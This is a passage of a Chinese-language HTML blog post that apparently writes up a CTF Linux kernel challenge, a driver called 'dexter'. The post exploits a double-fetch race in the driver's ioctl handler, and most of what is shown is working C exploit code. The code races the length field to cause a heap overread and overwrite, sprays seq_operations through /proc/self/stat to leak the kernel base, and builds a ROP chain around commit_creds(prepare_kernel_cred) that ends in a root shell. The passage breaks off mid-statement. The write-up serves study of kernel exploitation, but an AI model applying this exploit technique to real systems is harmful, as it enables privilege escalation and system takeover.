function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_SET<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  req<span class="token punctuation">.</span>ptr <span class="token operator">=</span> buf<span class="token punctuation">;</span>  req<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_GET<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> race_win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>race_win<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/dexter"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"/dev/dexter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> zero<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token class-name">pthread_t</span> th<span class="token punctuation">;</span>  <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>race_win<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">get</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> zero<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      race_win <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">pthread_join</span><span class="token punctuation">(</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x100</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x: 0x%016lx\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在主线程中，<code>cmd_get</code>使用正确的大小进行调用，而在子线程中，不断将用户空间的大小信息重写为非法值。如果子线程重写的时机在<code>verify_request</code>调用和<code>copy_data_to_user</code>调用之间，那么数据将以不正确的大小复制，从而造成堆缓冲区溢出。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">overread</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>zero <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">pthread_t</span> th<span class="token punctuation">;</span>    <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>zero<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>race_win<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">get</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> zero<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        race_win <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>      <span class="token function">pthread_join</span><span class="token punctuation">(</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    race_win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>zero<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">overwrite</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">pthread_t</span> th<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// 定数回でraceを試みる  </span>    <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">set</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      race_win <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token function">pthread_join</span><span class="token punctuation">(</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      race_win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment">// ヒープオーバーフローが成功していなければ再試行  </span>    <span class="token function">overread</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token function">free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="seq-operations"><a href="#seq-operations" class="headerlink" title="seq_operations"></a>seq_operations</h3><p>漏洞模块分配的缓冲区大小是32字节，因此堆喷过程需要使用同样为kmalloc-32的内核对象。我们选择<a href="https://elixir.bootlin.com/linux/v5.17.1/source/include/linux/seq_file.h#L32"><code>seq_operations</code>结构体</a>，该结构体大小刚好为32字节，包含4个函数指针：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">seq_operations</span> <span class="token punctuation">&#123;</span><span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>start<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>pos<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>stop<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>next<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>v<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>pos<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>show<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用户空间中打开<code>/proc/self/stat</code>文件的操作可以触发内核中<code>seq_operations</code>的分配。由于它<br>包含函数指针，因此可以泄漏内核的地址，并且还可以通过调用来控制RIP</p><h2 id="三-EXP"><a href="#三-EXP" class="headerlink" title="(三)EXP"></a>(三)EXP</h2><ol><li>首先在堆块周围堆喷seq_operations结构体，触发double fetch从而越界读，泄露内核基址</li><li>没有开启SMAP，我们可以在用户态布置ropchain，寻找合适的gadget来进行stack pivoting到用户态。</li></ol><p>值得注意的是，选择gadget时rsp需要8字节对齐。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8109b0cd</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_ESP_0x39000000_RET</span> <span class="token expression"><span class="token number">0xffffffff815b737f</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff8163d0ab</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff8110d88b</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff810729b0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff81072810</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span><span class="token class-name">size_t</span> len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token keyword">int</span> win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token class-name">request_t</span> req<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dexter_read</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>ptr<span class="token operator">=</span>buf<span class="token punctuation">;</span>req<span class="token punctuation">.</span>len<span class="token operator">=</span>size<span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xdec50001</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">dexter_write</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>ptr<span class="token operator">=</span>buf<span class="token punctuation">;</span>req<span class="token punctuation">.</span>len<span class="token operator">=</span>size<span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xdec50002</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>win<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>len<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>size<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">compete_read</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">pthread_t</span> compete_id<span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_id<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>win<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">dexter_read</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> leak<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>leak<span class="token operator">&amp;</span><span class="token number">0xffff000000000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xffff000000000000</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] compete_read Finished\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>win<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_join</span><span class="token punctuation">(</span>compete_id<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">compete_write</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">pthread_t</span> compete_id<span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_id<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">dexter_write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//pthread_join(compete_id,NULL);</span>win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//spray</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spary 50 seq_operations"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/dexter"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/dexter Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spary 50 seq_operations"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//leak</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">compete_read</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> seq_start<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span>seq_start<span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token operator">-</span><span class="token number">0x170f80</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] seq_start=>0x%lx\n"</span><span class="token 